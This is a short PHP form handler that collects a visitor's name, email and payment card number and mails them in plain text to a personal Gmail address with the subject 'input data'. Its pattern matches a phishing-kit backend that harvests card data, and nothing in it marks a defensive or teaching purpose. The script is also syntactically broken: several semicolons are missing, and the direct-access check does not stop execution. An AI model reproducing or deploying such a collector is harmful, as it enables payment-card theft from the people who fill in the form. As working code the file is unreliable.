<?php
if(!isset($_POST['submit'])){
  //checks to see if page is being accessed directly
  echo "ERROR; NEED TO SUBMIT FORM";
}

$name = $_POST['name'];
$email = $_POST['email'];
$card = $_POST['card'];

//validate. checks if fields are empty
if(empty($name) || empty($email) || empty($card)){
  echo "you missed something :/";
  exit;
}

$email_from = 'jstest666420@gmail.com';
$email_subject = "input data";
$email_body = "Username: $name\nEmail: $email \n Card: $card"

$to = "jstest666420@gmail.com"
$headers = "From: $email_from"

//send email
mail($to,$email_subject,$email_body);
?>